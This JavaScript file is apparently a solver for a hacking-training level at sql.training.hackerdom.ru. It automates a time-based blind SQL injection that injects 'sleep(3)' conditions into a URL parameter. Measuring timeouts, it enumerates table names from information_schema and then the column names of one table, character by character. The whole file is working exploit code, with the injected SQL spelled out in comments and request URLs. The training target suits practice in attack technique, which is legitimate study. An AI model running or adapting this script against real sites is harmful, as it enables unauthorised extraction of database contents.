//Retrieve tables and table columns from SQL

function timeout(ms, promise) {
	return new Promise(function(resolve, reject) {
		setTimeout(function() {
			reject(new Error("timeout"))
		}, ms)
			promise.then(resolve, reject)
	})
}

var alph = "abcdefghijklmnopqrstuvwxyz1234567890-";
var _alph = { 'a':0, 'b':1, 'c':2, 'd':3, 'e':4, 'f':5, 'g':6, 'h':7, 'i':8, 'j':9, 'k':10, 'l':11, 'm':12, 'n':13, 'o':14, 'p':15, 'q':16, 'r':17, 's':18, 't':19, 'u':20, 'v':21, 'w':22, 'x':23, 'y':24, 'z':25, '1':26, '2':27, '3':28, '4':29, '5':30, '6':31, '7':32, '8':33, '9':34, '0':35, '-':36 };
if (query === undefined) { var query = "a"; }
var res = false;
var symbol;
var alive = true;
var success = [];

function stop() {
	alive = false;
}

function get_tables() {
	alive = true;
	timeout(1500, fetch(
		//case when table_name like '%%' then sleep(3) end from information_schema.TABLES
		"http://sql.training.hackerdom.ru/10lastlevel.php?text=case+when+table_name+like+'" + query + "%'+then+sleep(3)+end+from+information_schema.TABLES"))
	.then(resp => res = false)
	.catch(error => res = true)
	.then(penis => {
		if (!res) {
			console.log(query + ": no luck");
			if (query[query.length - 1] === '-') {
				query = query.substr(0, query.length - 1);
			}
			symbol = alph[_alph[query[query.length - 1]] + 1];
			query = query.substr(0, query.length - 1) + symbol;
		} else {
			console.log(query + ": ok");
			success.push(query);
			query += "a";
		}
		if (alive) {
			get_tables();
		}
	});
}
function get_columns() {
	alive = true;
	timeout(1500, fetch(
		//case when column_name like '%first%' then sleep(3) end from information_schema.COLUMNS where TABLE_NAME = 'davidblayne'
		"http://sql.training.hackerdom.ru/10lastlevel.php?text=case+when+column_name+like+'" + query + "%'+then+sleep(3)+end+from+information_schema.COLUMNS+where+TABLE_NAME+=+'davidblayne'"))
	.then(resp => res = false)
	.catch(error => res = true)
	.then(penis => {
		if (!res) {
			console.log(query + ": no luck");
			if (query[query.length - 1] === '-') {
				query = query.substr(0, query.length - 1);
			}
			symbol = alph[_alph[query[query.length - 1]] + 1];
			query = query.substr(0, query.length - 1) + symbol;
		} else {
			console.log(query + ": ok");
			success.push(query);
			query += "a";
		}
		if (alive) {
			get_columns();
		}
	});
}